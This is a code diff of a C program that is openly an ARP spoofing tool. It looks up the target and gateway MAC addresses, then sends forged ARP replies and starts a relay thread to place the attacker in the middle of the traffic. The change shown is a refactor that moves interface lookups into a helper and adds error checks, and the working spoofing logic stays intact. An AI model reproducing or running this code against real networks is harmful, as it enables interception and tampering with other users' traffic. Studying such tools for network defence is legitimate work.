@@ -1,6 +1,5 @@
 #include "protocol.h"
 #define TIME_SEC 1
-enum {INDEX, HWADDR, ADDR};
 
 int g_signal_fleg;
 
@@ -24,11 +23,8 @@ int main(int argc, char **argv)
 {
     int sock, len,result;
     struct sockaddr_ll sll;
-    struct sockaddr_in *my_ip;
-    struct ifreq ifr[3];
     struct nic_info info;
     uint8_t *buffer;
-    uint8_t  my_mac[6];
     struct in_addr target_ip, host_ip;
     pthread_t thread_id;
     struct thread_arg thread_arg;
@@ -41,31 +37,11 @@ int main(int argc, char **argv)
         return -1;
     }
 
-    // for(int i=0 ;i <3 ; i++)
-    // {
-    //     memset(&ifr[i], 0x00, sizeof(struct ifreq));
-    //     strcpy(ifr[i].ifr_name, IN_NAME);
-    // }
-
-    // if((ioctl(sock, SIOCGIFINDEX, &ifr[INDEX]))<0)
-    // {
-    //     perror("ioctl index");
-    //     return -1;
-    // }
-    // if((ioctl(sock, SIOCGIFHWADDR, &ifr[HWADDR]))<0)
-    // {
-    //     perror("ioctl hwaddr");
-    //     return -1;
-    // }
-    // if((ioctl(sock, SIOCGIFADDR, &ifr[ADDR]))<0)
-    // {
-    //     perror("ioctl addr");
-    //     return -1;
-    // }
-
-    get_info(&info, "eth0");
-    memcpy(my_mac, ifr[HWADDR].ifr_hwaddr.sa_data, 6);
-    my_ip = (struct sockaddr_in *)&ifr[ADDR].ifr_addr;
+    if(get_info(&info, "eth0")<0)
+    {
+        printf("Interface Name error\n");
+        return -1;
+    }
     if(!inet_aton(argv[1],&target_ip))
     {
         printf("Target IP error\n");
@@ -84,15 +60,15 @@ int main(int argc, char **argv)
     pthread_create(&thread_id, NULL, thread_recivarp, &thread_arg);
 
     memset(&sll, 0, sizeof(sll));
-    sll.sll_ifindex = ifr[INDEX].ifr_ifindex;
+    sll.sll_ifindex = info.ifindex;
     sll.sll_halen = ETH_ALEN; // length of destination mac address
     memset(sll.sll_addr, 0xFF, 6);
 
-    buffer = make_arp_request_packet(my_mac, my_ip->sin_addr, target_ip);
+    buffer = make_arp_request_packet(info.my_mac, info.in_addr, target_ip);
     if((len = sendto(sock, buffer, ARPMAX,0,(struct sockaddr*)&sll,sizeof(sll)))<0)
         perror("sendto"); 
         
-    buffer = make_arp_request_packet(my_mac, my_ip->sin_addr, host_ip);
+    buffer = make_arp_request_packet(info.my_mac, info.in_addr, host_ip);
     if((len = sendto(sock, buffer, ARPMAX,0,(struct sockaddr*)&sll,sizeof(sll)))<0)
         perror("sendto");  
 
@@ -103,7 +79,7 @@ int main(int argc, char **argv)
     
     pthread_create(&thread_id, NULL, thread_relay, arp_data->host_mac);
 
-    buffer = make_arp_reply_packet(my_mac ,host_ip ,arp_data->target_mac ,target_ip);
+    buffer = make_arp_reply_packet(info.my_mac, host_ip ,arp_data->target_mac ,target_ip);
 
     printf("ARP Spoofing...\n");
     signal(SIGINT, INThandler);
